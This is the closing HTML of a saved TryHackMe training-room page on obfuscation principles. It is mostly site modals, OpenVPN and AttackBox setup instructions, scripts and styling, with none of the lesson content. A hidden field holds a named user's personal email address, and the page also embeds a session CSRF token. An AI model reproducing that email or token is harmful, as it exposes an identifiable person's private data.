<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center"></div>
<div class="modal-footer"></div>
</div>
</div>
</div>
<link rel="stylesheet" href="./TryHackMe _ Obfuscation Principles_files/modal.css">
<div class="modal-design-green modal fade" id="roomCompleted" tabindex="-1" role="dialog" data-backdrop="static" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content" id="roomCompletedModalContent">
<div class="modal-body text-center">
<button type="button" class="close" id="closeRoomComplete" aria-label="Close">
<i class="fad fa-times-circle"></i>
</button>
<div class="icon-box">
<i class="fad fa-badge-check"></i>
</div>
<h3 class="text-accent mt-5">Congratulations</h3>
<p class="faded mt-1">You've completed the room! Share this with your friends: </p>
<h2 id="roomCompleted-share"></h2>
<div id="ticket-info"></div> 
<p class="faded mt-1" id="roomFeedbackBtn">
<small>
<button class="bg-white border-0">Leave
feedback</button>
</small>
</p>
<form method="post" action="https://tryhackme.com/feedback" id="roomFeedbackForm" class="d-none mt-3">
<input type="hidden" name="_csrf" value="BVuqjKdW-1ExZ_K-5YKoBnXHZ8BE5KfnPlLU">
<input type="hidden" name="roomCode" value="obfuscationprinciples">
<input type="hidden" name="type" value="rooms">
<input type="hidden" name="redirect" value="json">
<div class="form-group">
<label class="mb-0" for="like">What do you like about the room?</label>
<textarea type="text" name="like" id="like" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="dislike">What don't you like about the room?</label>
<textarea type="text" name="dislike" id="dislike" class="form-control"></textarea>
</div>
<div class="form-group">
<label class="mb-0" for="details">Please send your suggestions, ideas and comments!</label>
<textarea id="details" type="text" name="details" class="form-control" style="padding: 5px;"></textarea>
</div>
<button type="submit" id="submitBtn" class="btn btn-success">Send Feedback</button>
</form>
<p class="mt-2 mb-0" id="formMessage"></p>
</div>
</div>
</div>
<script>
    function dismissRoomCompleteModal() {
      $('#roomCompleted').modal('hide');

      const shouldSeeReferralModal = ""
      if (shouldSeeReferralModal) {
        $('#unlockCreditModal').modal('show');

        referralModalEvent('view');
      }
    }

    document.getElementById('closeRoomComplete').addEventListener('click', dismissRoomCompleteModal)
  </script>
</div>
<script src="./TryHackMe _ Obfuscation Principles_files/roomFeedback.js"></script>
<div class="modal fade" id="roomStartAttackboxModal" tabindex="-1" role="dialog" aria-hidden="true" data-backdrop="static" data-keyboard="false">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title m-auto">To access this machine, you need to either</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close" style="position: absolute; right: 10px; top: 0; font-size: 30px;">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<div class="row vertical-align-custom mb-0">
<div class="col-sm-5 pr-0">
<p class="size-18 bold">Use a VPN</p>
<p>Connect to our network via a VPN</p>
<a target="_blank" href="https://tryhackme.com/access"><button type="button" class="btn btn-light">See Instructions</button></a>
</div>
<div class="col-sm-2 size-24">
or
</div>
<div class="col-sm-5 pl-0">
<p class="size-18 bold">Use the AttackBox</p>
<p>Use a web-based attack machine <span class="size-12">(recommended)</span></p>
<button type="button" onclick="$(&#39;#roomStartAttackboxModal&#39;).modal(&#39;toggle&#39;); startAttackBox({startingMsg: false, tutorial: true})" class="btn btn-hgreen">Start AttackBox</button>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="expireSoon" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-warning fad fa-exclamation-triangle"></i></h1>
<h3 class="text-warning">Expiring Soon</h3>
<p class="faded mt-3 mb-0">Your machine is going to expire soon. Close this and add an hour to stop it from terminating!</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="terminatedMachine" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-sm" role="document">
<div class="modal-content">
<div class="modal-body text-center">
<h1><i class="text-danger fad fa-exclamation-triangle"></i></h1>
<h3 class="text-danger">Expired Machine</h3>
<p class="faded mt-3 mb-0">Your machine has expired and terminated.</p>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal-design-green modal fade" id="machineDeployModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue text-center p-3">
<h4 class="mb-0 m-auto">How to access machines</h4>
<button type="button" class="close modal-close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body text-center">
<p class="size-18 faded">Now you've started your machine, to access it you need to either</p>
<div class="row mb-0">
<div class="col-sm-6">
<img src="./TryHackMe _ Obfuscation Principles_files/connect_openvpn_short.png">
<p class="mt-2 mb-0 faded">Download your VPN configuration file and import it into a OpenVPN client</p>
</div>
<div class="col-sm-6">
<img src="./TryHackMe _ Obfuscation Principles_files/connect_kali_short.png">
<p class="mt-2 mb-0 faded">Control a web-based machine with everything you need, all from inside your browser</p>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="modal fade" id="roomAlertModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title" id="roomAlertModalTitle"></h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body" id="roomAlertModalBody"></div>
<div class="modal-footer">
<button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="resetUserProgressModal" role="dialog">
<div class="modal-dialog" role="document">
<div class="modal-content">
<div class="modal-header">
<h5 class="modal-title">Reset Your Progress</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<div><span class="text-danger"><i class="fas fa-exclamation-triangle"></i> Warning</span> You will keep your points but all your answers in this room will be erased.</div>
</div>
<div class="modal-footer">
<button type="button" class="btn btn-danger" onclick="resetProgress()">Yes, please!</button>
</div>
</div>
</div>
</div>
<div class="modal fade" id="cloudEnvInfoModal" tabindex="-1" role="dialog" aria-hidden="true">
<div class="modal-dialog modal-dialog-centered modal-lg" role="document">
<div class="modal-content">
<div class="modal-header  modal-dark-blue">
<h5 class="modal-title">Cloud Information</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body">
<ul class="nav nav-tabs">
<li class="nav-item pr-2">
<a class="nav-link active" data-toggle="tab" href="https://tryhackme.com/room/obfuscationprinciples#env-tab">Environment</a>
</li>
<li class="nav-item">
<a class="nav-link" data-toggle="tab" href="https://tryhackme.com/room/obfuscationprinciples#creds-tab">Credentials</a>
</li>
</ul>
<div class="tab-content">
<div class="tab-pane active" id="env-tab"></div>
<div class="tab-pane" id="creds-tab"></div>
</div>
</div>
<div class="modal-footer" id="cloudEnvModalFooter">
</div>
</div>
</div>
</div>
<div class="modal fade" id="setNameModal" role="dialog">
<div class="modal-dialog modal-lg modal-dialog-centered" role="document">
<div class="modal-content">
<div class="modal-header modal-dark-blue">
<h5 class="modal-title">Generating Your Certificate</h5>
<button type="button" class="close" data-dismiss="modal" aria-label="Close">
<span aria-hidden="true">×</span>
</button>
</div>
<div class="modal-body container">
<div class="row">
<div class="col-6">
<h5 class="bold">Hey there, what's your name?</h5>
<p class="text-secondary">
If you want your name to appear on your certificate, please fill the field below.
</p>
<div class="form-group">
<label>Full Name </label>
<input id="modal-cert-field-name" type="text" placeholder="John Wick" class="mb-4 form-control">
<input id="modal-cert-field-email" type="hidden" value="giftonpaul@karunya.edu.in">
</div>
</div>
<div class="col-6">
<h5 class="bold">You're here incognito? It's ok!</h5>
<p class="text-secondary">If you chose skip, your username will be used instead!</p>
</div>
</div>
<div class="row">
<div class="col-6">
<button type="button" class="btn btn-success float-right" id="modal-cert-generate" onclick="gen_cert(true)" disabled="">
Generate with my full name
</button>
</div>
<div class="col-6">
<button type="button" class="btn btn-primary float-right" id="modal-cert-skip" onclick="gen_cert(false)">
Generate with my username
</button>
</div>
</div>
</div>
</div>
</div>
</div>
<script src="./TryHackMe _ Obfuscation Principles_files/certificateName.js"></script>
<div class="modal fade slideout-faq" id="roomSlideoutUnstuck" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-links">
<div id="unstuck-video" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-play"></i></div>
<div class="unstuck-icon-text">Video Solution</div>
</div>
<div id="unstuck-writeups" class="unstuck-group" style="display: none;">
<div class="unstuck-icon"><i class="fas fa-pen-alt"></i></div>
<div class="unstuck-icon-text">Writeups</div>
</div>
<a id="unstuck-forum" target="_blank" class="clear-link unstuck-group" href="https://tryhackme.com/forum/thread/630e310c8d6b160055e6e084">
<div class="unstuck-icon"><i class="fas fa-comments-alt"></i></div>
<div class="unstuck-icon-text">Forum Post</div>
</a>
<a href="https://help.tryhackme.com/en/collections/3601905-getting-started-with-tryhackme" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-books"></i></div>
<div class="unstuck-icon-text">Knowledge Base</div>
</a>
<a href="https://discord.gg/DpBZz8y" target="_blank" class="clear-link unstuck-group">
<div class="unstuck-icon"><i class="fas fa-users"></i></div>
<div class="unstuck-icon-text">Ask Community</div>
</a>
</div>
</div>
</div>
</div>
</div>
<style>

    #navConnModal .modal-body{
        position: relative;
    }

    #nav-openvpn,
    #nav-attackbox {
        display: none;
    }

    #nav-openvpn .nav-pills .nav-link.active,
    #nav-openvpn .nav-pills .show>.nav-link {
        background-color: #ec8e3d;
        color: white;
    }
    #nav-openvpn .nav-link {
        color: #909090;
    }
    #nav-openvpn a,
    #nav-attackbox a {
        color: #ec8e3d;
    }

    #nav-openvpn code.dark {
        background-color: #7d400a;
        color: #fff;
    }

    #slideout-bk {
        display: none;
        padding: 10px 15px;
        opacity: 0.8;
        cursor: pointer;
    }

    #slideout-bk:hover {
        opacity: 1;
    }

    #slideout-conn-hideip {
        display: none;
        position: absolute;
        bottom: 8px;
        right: 8px;
        opacity: 0.7;
        cursor: pointer;
    }

    #slideout-conn-hideip:hover {
        opacity: 1;
    }

</style>
<div class="modal fade slideout-faq" id="navConnModal" tabindex="-1" role="dialog">
<div class="modal-dialog modal-dialog-slideout" role="document">
<div class="modal-content">
<div class="modal-body">
<div id="slideout-bk" class="noselect" onclick="showSlideoutConnOptions()"><i class="far fa-arrow-left mr-2"></i> Show Connection Options</div>
<div id="slideout-conn-options">
<div id="slideout-conn-header" class="text-center">
<img class="slideout-connect-img" src="./TryHackMe _ Obfuscation Principles_files/tryhackme_connect.png">
<div id="slideout-conn-status" class="size-22">You are <span class="text-danger">disconnected</span></div>
</div>
<div class="m-3 text-center">
<p>To access target machines you need to either:</p>
<div class="row mb-3 faq-quicklinks text-left vertical-align-custom">
<div class="col-md-12 mb-3">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/obfuscationprinciples#" onclick="showAttackBoxSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-laptop"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">AttackBox</div>
<p class="faded mb-0">Use a browser-based attack machine</p>
</div>
</div>
</div>
</a>
</div>
<div class="col-md-12">
<a class="clear-link preventDefault" href="https://tryhackme.com/room/obfuscationprinciples#" onclick="showVPNSteps()">
<div class="card card-body">
<div class="row vertical-align-custom">
<div class="col col-2 text-center faq-quicklinks-icons">
<i class="far fa-key"></i>
</div>
<div class="col">
<div class="faq-quicklinks-title size-18">OpenVPN</div>
<p class="faded mb-0">Connect to our network via a VPN</p>
</div>
</div>
</div>
</a>
</div>
</div>
</div>
</div>
<div id="faqCards" class="p-3">
<div id="nav-openvpn">
<div class="mb-3">
<a target="_blank" href="https://tryhackme.com/access"><i>View the dedicated OpenVPN access page for more information</i></a>
</div>
<div class="text-center">
<h4>What Operating System are you using?</h4>
<ul class="nav nav-pills mb-3 text-center" id="vpn-guide" style="display: flex; justify-content: center;">
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/obfuscationprinciples#pills-windows" role="tab" aria-controls="pills-windows" aria-selected="true"><i class="fab fa-windows mr-2"></i> Windows</a>
</li>
<li class="nav-item m-3">
<a class="nav-link active" data-toggle="pill" href="https://tryhackme.com/room/obfuscationprinciples#pills-linux" role="tab" aria-controls="pills-linux" aria-selected="false"><i class="fab fa-linux mr-2"></i> Linux</a>
</li>
<li class="nav-item m-3">
<a class="nav-link" data-toggle="pill" href="https://tryhackme.com/room/obfuscationprinciples#pills-macos" role="tab" aria-controls="pills-macos" aria-selected="false"><i class="fab fa-apple mr-2"></i> MacOS</a>
</li>
</ul>
<div class="tab-content text-left">
<div class="tab-pane fade" id="pills-windows" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a target="_blank" href="https://openvpn.net/client-connect-vpn-for-windows/">Download</a> the OpenVPN GUI application.</li>
<li class="mt-2">Install the OpenVPN GUI application. Then open the installer file and follow the setup wizard.</li>
<li class="mt-2">Open and run the OpenVPN GUI application as Administrator.<br><img class="mt-2 mb-3" src="./TryHackMe _ Obfuscation Principles_files/win_ran_admin.png"></li>
<li class="mt-2">The application will start running in the system tray. It's at the bottom of your screen, near the clock. Right click on the application and click <b>Import File</b>. <br><img class="mt-2 mb-3" src="./TryHackMe _ Obfuscation Principles_files/win_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Now right click on the application again, select your file and click Connect <br><img class="mt-2 mb-3" src="./TryHackMe _ Obfuscation Principles_files/win_connect.png"></li>
</ol>
</div>
<div class="tab-pane fade show active" id="pills-linux" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2">Run the following command in your terminal: <code class="dark">sudo apt install openvpn</code></li>
<li class="mt-2">Locate the full path to your VPN configuration file (normally in your ~/Downloads folder).</li>
<li class="mt-2">Use your OpenVPN file with the following command: <code class="dark">sudo openvpn /path/to/file.ovpn</code></li>
</ol>
</div>
<div class="tab-pane fade" id="pills-macos" role="tabpanel">
<ol>
<li><a href="https://tryhackme.com/vpn/get-config">Download</a> your OpenVPN configuration pack.</li>
<li class="mt-2"><a href="https://openvpn.net/downloads/openvpn-connect-v2-macos.dmg">Download</a> OpenVPN for MacOS.</li>
<li class="mt-2">Install the OpenVPN GUI application, by opening the dmg file and following the setup wizard.<br><img width="250" class="mt-2 mb-3" src="./TryHackMe _ Obfuscation Principles_files/mac_installer.png"></li>
<li class="mt-2">Open and run the OpenVPN GUI application.</li>
<li class="mt-2">The application will start running and appear in your top bar. Right click on the application and click <b>Import File -&gt; Local file</b>.<br><img class="mt-2 mb-3" src="./TryHackMe _ Obfuscation Principles_files/mac_import.png"></li>
<li class="mt-2">Select the configuration file you downloaded earlier.</li>
<li class="mt-2">Right click on the application again, select your file and click connect.<br><img class="mt-2 mb-3" src="./TryHackMe _ Obfuscation Principles_files/mac_connect.png"></li>
</ol>
</div>
</div>
<section class="text-left">
<a class="remove-underline" data-toggle="collapse" href="https://tryhackme.com/room/obfuscationprinciples#havingProblems" role="button" aria-expanded="false" aria-controls="havingProblems">
<h5 class="mb-0 text-openvpn">Having Problems?</h5>
</a>
<div class="collapse" id="havingProblems">
<ul class="mt-2 mb-0">
<li>If you can access <a target="_blank" href="http://10.10.10.10/">10.10.10.10</a>, you're connected.</li>
<li>Downloading and getting a 404? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>Getting inline cert error? Go the <a href="https://tryhackme.com/access">access</a> page and switch VPN servers.</li>
<li>If you are using a virtual machine, you will need to run the VPN inside that machine.</li>
<li>Is the OpenVPN client running as root? <span class="size-14 faded">(On Windows, run OpenVPN GUI as administrator. On Linux, run with sudo)</span></li>
<li>Have you restarted your VM?</li>
<li>Is your OpenVPN up-to-date?</li>
<li>Only 1 OpenVPN connection is allowed. <span class="size-14 faded">(Run <code class="dark">ps aux | grep openvpn</code> - are there 2 VPN sessions running?)</span></li>
<li>Still having issues? Check our <a href="https://help.tryhackme.com/en/articles/6496029-openvpn-general-troubleshooting-detailed/">docs</a> out.</li>
</ul>
</div>
</section>
</div>
</div>
<div id="nav-attackbox">
<div class="text-center">
<h4>AttackBox</h4>
<p class="faded">Use your own web-based linux machine to access machines on TryHackMe</p>
</div>
<p>To start your AttackBox in the room, click the <a class="preventDefault" onclick="showAttackBoxBtnFromSlideout()" href="https://tryhackme.com/room/obfuscationprinciples#">Start AttackBox</a> button. Your private machine will take 2 minutes to start.</p>
<p>Free users get 1 free AttackBox hour. <a class="hacker-green" href="https://tryhackme.com/why-subscribe">Subscribed</a> users get more powerful machines with unlimited deploys.</p>
</div>
</div>
<span id="slideout-conn-hideip" onclick="hideNavConnIP()" style="display: none;">Hide IP</span>
</div>
</div>
</div>
</div>
<script>

    const navConnVPNEl = document.querySelector('#nav-openvpn')
    const navConnAttackBoxEl = document.querySelector('#nav-attackbox')
    const navConnOptions = document.querySelector('#slideout-conn-options')

    const navConnBkBtn = document.querySelector('#slideout-bk')

    function showVPNSteps() {
        navConnOptions.style.display = 'none'
        navConnVPNEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showAttackBoxSteps() {
        navConnOptions.style.display = 'none'
        navConnAttackBoxEl.style.display = 'block'
        navConnBkBtn.style.display = 'block'
    }

    function showSlideoutConnOptions() {
        navConnVPNEl.style.display = 'none'
        navConnAttackBoxEl.style.display = 'none'
        navConnBkBtn.style.display = 'none'
        navConnOptions.style.display = 'block'
    }

    function showAttackBoxBtnFromSlideout() {
        $('#navConnModal').modal('toggle')
        setTimeout(function() {
            showAttackBoxBtnIntro()
        }, 100)   
    }

  </script>
</div>
<script src="./TryHackMe _ Obfuscation Principles_files/notify.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/api-requests.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/events.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/underscore-min.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/apexcharts.min.js"></script> 
<script src="./TryHackMe _ Obfuscation Principles_files/chart.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/expire.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/sockets.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/faqSearch.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/certificate.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/utils.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/roomSpecific.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/confetti.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/videos.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/intro.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/prism.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/asciinema-player.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/magnific-popup.min.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/introjsLogic.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/logic.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/tasks.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/connection-status.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/glossary.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/room-mymachine.js"></script>
<script src="./TryHackMe _ Obfuscation Principles_files/heartbeat.js" defer=""></script>
<script>

    let height
    $(window).scroll(function () { /* Function to make IP information sticky. */
      if (height == undefined || height < 30) {
        height = ($('#instance-info').offset().top)
      }
      let scroll = $(window).scrollTop()
      if (((scroll >= (height + 150))) && height > 30) {
        $("#instance-info").addClass('instance-sticky')
      } else if ((scroll <= (height))) {
        $("#instance-info").removeClass("instance-sticky")
      }
    })

    const csrfToken = "BVuqjKdW-1ExZ_K-5YKoBnXHZ8BE5KfnPlLU"
    $.ajaxSetup({ headers: { 'CSRF-Token': csrfToken } }) // all $.post headers include token (needs csrfProtection middleware)

    const roomCode = "obfuscationprinciples"
    const simpleRoom = true 
    const events = {"tickets":false}

    let userObj = { 
      subscribed: 1,
      splitScreen: true,
      path: "redteaming",
      tutorial: {
        rooms: true,
        attackbox: true,
        staticsite: true
      },
      experiments:  JSON.parse(`{"onboardingAchievement":{},"scheduler":{"startDate":"2023-06-14T13:38:51.108Z"},"showEasyPath":true}`),
    }

    const roomSettings = {
      remAttackBoxBtn : false
    };

    const heartbeatInterval = 30;

    const cloudEnabled = false 
    let cloudObj

    initRoom()
    checkVideoTab()
    if(!simpleRoom) showChart(roomCode)

    checkRoomAwards(roomCode)

    getRoomVotes()

    displayStreakFreezeAwardedFromMemory();
    
    window.addEventListener('load', function () {
      introjsInit(roomCode)
    })

  </script>


<svg id="SvgjsSvg1001" width="2" height="0" xmlns="http://www.w3.org/2000/svg" version="1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:svgjs="http://svgjs.dev" style="overflow: hidden; top: -100%; left: -100%; position: absolute; opacity: 0;"><defs id="SvgjsDefs1002"></defs><polyline id="SvgjsPolyline1003" points="0,0"></polyline><path id="SvgjsPath1004" d="M0 0 "></path></svg><div id="4234E05C-370D-5011-ADFD-1B9346AA8965"></div><iframe id="_hjSafeContext_86035816" title="_hjSafeContext" tabindex="-1" aria-hidden="true" src="./TryHackMe _ Obfuscation Principles_files/saved_resource.html" style="display: none !important; width: 1px !important; height: 1px !important; opacity: 0 !important; pointer-events: none !important;"></iframe><iframe id="intercom-frame" style="position: absolute !important; opacity: 0 !important; width: 1px !important; height: 1px !important; top: 0 !important; left: 0 !important; border: none !important; display: block !important; z-index: -1 !important; pointer-events: none;" aria-hidden="true" tabindex="-1" title="Intercom" src="./TryHackMe _ Obfuscation Principles_files/saved_resource(1).html"></iframe><div class="intercom-lightweight-app"><div class="intercom-lightweight-app-launcher intercom-launcher" role="button" tabindex="0" aria-label="Open Intercom Messenger" aria-live="polite"><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-open"><img src="./TryHackMe _ Obfuscation Principles_files/9e0f012f15b6fc981dde2f1f5198d728.png" alt="" class="intercom-lightweight-app-launcher-custom-icon-open"></div><div class="intercom-lightweight-app-launcher-icon intercom-lightweight-app-launcher-icon-minimize"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
  <path fill-rule="evenodd" clip-rule="evenodd" d="M18.601 8.39897C18.269 8.06702 17.7309 8.06702 17.3989 8.39897L12 13.7979L6.60099 8.39897C6.26904 8.06702 5.73086 8.06702 5.39891 8.39897C5.06696 8.73091 5.06696 9.2691 5.39891 9.60105L11.3989 15.601C11.7309 15.933 12.269 15.933 12.601 15.601L18.601 9.60105C18.9329 9.2691 18.9329 8.73091 18.601 8.39897Z" fill="white"></path>
</svg>
</div></div><style id="intercom-lightweight-app-style" type="text/css">
  @keyframes intercom-lightweight-app-launcher {
    from {
      opacity: 0;
      transform: scale(0.5);
    }
    to {
      opacity: 1;
      transform: scale(1);
    }
  }

  @keyframes intercom-lightweight-app-gradient {
    from {
      opacity: 0;
    }
    to {
      opacity: 1;
    }
  }

  @keyframes intercom-lightweight-app-messenger {
    0% {
      opacity: 0;
      transform: scale(0);
    }
    40% {
      opacity: 1;
    }
    100% {
      transform: scale(1);
    }
  }

  .intercom-lightweight-app {
    position: fixed;
    z-index: 2147483001;
    width: 0;
    height: 0;
    font-family: intercom-font, "Helvetica Neue", "Apple Color Emoji", Helvetica, Arial, sans-serif;
  }

  .intercom-lightweight-app-gradient {
    position: fixed;
    z-index: 2147483002;
    width: 500px;
    height: 500px;
    bottom: 0;
    right: 0;
    pointer-events: none;
    background: radial-gradient(
      ellipse at bottom right,
      rgba(29, 39, 54, 0.16) 0%,
      rgba(29, 39, 54, 0) 72%);
    animation: intercom-lightweight-app-gradient 200ms ease-out;
  }

  .intercom-lightweight-app-launcher {
    position: fixed;
    z-index: 2147483003;
    padding: 0 !important;
    margin: 0 !important;
    border: none;
    bottom: 20px;
    right: 20px;
    max-width: 48px;
    width: 48px;
    max-height: 48px;
    height: 48px;
    border-radius: 50%;
    background: #1C2538;
    cursor: pointer;
    box-shadow: 0 1px 6px 0 rgba(0, 0, 0, 0.06), 0 2px 32px 0 rgba(0, 0, 0, 0.16);
    transition: transform 167ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    box-sizing: content-box;
  }


  .intercom-lightweight-app-launcher:hover {
    transition: transform 250ms cubic-bezier(0.33, 0.00, 0.00, 1.00);
    transform: scale(1.1)
  }

  .intercom-lightweight-app-launcher:active {
    transform: scale(0.85);
    transition: transform 134ms cubic-bezier(0.45, 0, 0.2, 1);
  }


  .intercom-lightweight-app-launcher:focus {
    outline: none;

    
  }

  .intercom-lightweight-app-launcher-icon {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 0;
    left: 0;
    width: 48px;
    height: 48px;
    transition: transform 100ms linear, opacity 80ms linear;
  }

  .intercom-lightweight-app-launcher-icon-open {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-open svg {
    width: 24px;
    height: 24px;
  }

  .intercom-lightweight-app-launcher-icon-open svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-icon-self-serve {
    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg {
    height: 44px;
  }

  .intercom-lightweight-app-launcher-icon-self-serve svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-launcher-custom-icon-open {
    max-height: 24px;
    max-width: 24px;

    
        opacity: 1;
        transform: rotate(0deg) scale(1);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize {
    
        opacity: 0;
        transform: rotate(-60deg) scale(0);
      
  }

  .intercom-lightweight-app-launcher-icon-minimize svg path {
    fill: rgb(255, 255, 255);
  }

  .intercom-lightweight-app-messenger {
    position: fixed;
    z-index: 2147483003;
    overflow: hidden;
    background-color: white;
    animation: intercom-lightweight-app-messenger 250ms cubic-bezier(0, 1, 1, 1);
    transform-origin: bottom right;
    
        width: 400px;
        height: calc(100% - 104px);
        max-height: 704px;
        min-height: 250px;
        right: 20px;
        bottom: 84px;
        box-shadow: 0 5px 40px rgba(0,0,0,0.16);
      

    border-radius: 16px;
  }

  .intercom-lightweight-app-messenger-header {
    height: 64px;
    border-bottom: none;
    background: #1c2538

    
  }

  .intercom-lightweight-app-messenger-footer{
    position:absolute;
    bottom:0;
    width: 100%;
    height: 80px;
    background: #fff;
    font-size: 14px;
    line-height: 21px;
    border-top: 1px solid rgba(0, 0, 0, 0.05);
    box-shadow: 0px 0px 25px rgba(0, 0, 0, 0.05);
    
  }

  @media print {
    .intercom-lightweight-app {
      display: none;
    }
  }
</style></div></body></html>